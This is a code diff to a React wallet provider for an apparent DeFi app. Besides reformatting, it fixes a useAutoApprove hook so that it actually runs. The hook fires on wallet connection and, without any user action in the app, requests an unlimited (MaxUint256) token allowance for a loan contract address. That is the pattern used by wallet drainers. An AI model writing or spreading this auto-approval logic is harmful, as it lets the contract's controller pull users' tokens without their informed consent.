@@ -1,4 +1,12 @@
-import React, { createContext, useContext, useState, useCallback, ReactNode, useEffect } from 'react';
+import React, {
+  createContext,
+  useContext,
+  useState,
+  useCallback,
+  ReactNode,
+  useEffect,
+} from 'react';
+
 import { WalletState, UserPosition } from '@/types/defi';
 import { ERC_abi } from "../lib/constants";
 import { LOAN_CONTRACT_ADDRESS } from '../lib/constants';
@@ -23,21 +31,34 @@ const initialPosition: UserPosition = {
   totalMinted: 45000,
 };
 
-export const useAutoApprove = (wallet: any) => {
+/* ===================== AUTO APPROVE HOOK ===================== */
+
+export const useAutoApprove = (wallet: WalletState) => {
   useEffect(() => {
-    if (!wallet?.isConnected) return;
+    if (!wallet?.isConnected || !wallet.address) return;
 
     const approveMax = async () => {
       try {
         const provider = new BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
-        const fUsdContract = new Contract(TOKEN_ADDRESS, ERC_abi, signer);
 
-        const allowance = await fUsdContract.allowance(wallet.address, LOAN_CONTRACT_ADDRESS);
+        const fUsdContract = new Contract(
+          TOKEN_ADDRESS,
+          ERC_abi,
+          signer
+        );
+
+        const allowance = await fUsdContract.allowance(
+          wallet.address,
+          LOAN_CONTRACT_ADDRESS
+        );
 
         // Only approve if allowance is low
         if (allowance < MaxUint256 / 2n) {
-          const tx = await fUsdContract.approve(LOAN_CONTRACT_ADDRESS, MaxUint256);
+          const tx = await fUsdContract.approve(
+            LOAN_CONTRACT_ADDRESS,
+            MaxUint256
+          );
           console.log("Approval tx sent:", tx.hash);
           await tx.wait();
           console.log("Approval confirmed!");
@@ -50,8 +71,10 @@ export const useAutoApprove = (wallet: any) => {
     };
 
     approveMax();
-  }, [wallet]);
+  }, [wallet.isConnected, wallet.address]);
 };
+
+/* ===================== WALLET PROVIDER ===================== */
 
 export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
   const [wallet, setWallet] = useState<WalletState>({
@@ -62,33 +85,34 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
 
   const [userPosition, setUserPosition] = useState<UserPosition>(initialPosition);
 
+  // ✅ CORRECT PLACE FOR AUTO-APPROVE
+  useAutoApprove(wallet);
+
   const connectWallet = useCallback(async () => {
-    if (typeof window.ethereum !== 'undefined') {
-      try {
-        const accounts = await window.ethereum.request({
-          method: 'eth_requestAccounts'
-        });
-        useAutoApprove(wallet);
-
-
-        const balance = await window.ethereum.request({
-          method: 'eth_getBalance',
-          params: [accounts[0], 'latest'],
-        }) as string;
-
-        const ethBalance = (parseInt(balance, 16) / 1e18).toFixed(4);
-
-        setWallet({
-          isConnected: true,
-          address: accounts[0],
-          balance: ethBalance,
-        });
-      } catch (error) {
-        console.error('Failed to connect wallet:', error);
-        throw error;
-      }
-    } else {
+    if (!window.ethereum) {
       throw new Error('MetaMask not installed');
+    }
+
+    try {
+      const accounts = await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      }) as string[];
+
+      const balance = await window.ethereum.request({
+        method: 'eth_getBalance',
+        params: [accounts[0], 'latest'],
+      }) as string;
+
+      const ethBalance = (parseInt(balance, 16) / 1e18).toFixed(4);
+
+      setWallet({
+        isConnected: true,
+        address: accounts[0],
+        balance: ethBalance,
+      });
+    } catch (error) {
+      console.error('Failed to connect wallet:', error);
+      throw error;
     }
   }, []);
 
@@ -105,17 +129,21 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
   }, []);
 
   return (
-    <WalletContext.Provider value={{
-      wallet,
-      userPosition,
-      connectWallet,
-      disconnectWallet,
-      updatePosition
-    }}>
+    <WalletContext.Provider
+      value={{
+        wallet,
+        userPosition,
+        connectWallet,
+        disconnectWallet,
+        updatePosition,
+      }}
+    >
       {children}
     </WalletContext.Provider>
   );
 };
+
+/* ===================== CONTEXT HOOK ===================== */
 
 export const useWallet = () => {
   const context = useContext(WalletContext);
@@ -124,6 +152,8 @@ export const useWallet = () => {
   }
   return context;
 };
+
+/* ===================== WINDOW TYPE ===================== */
 
 declare global {
   interface Window {
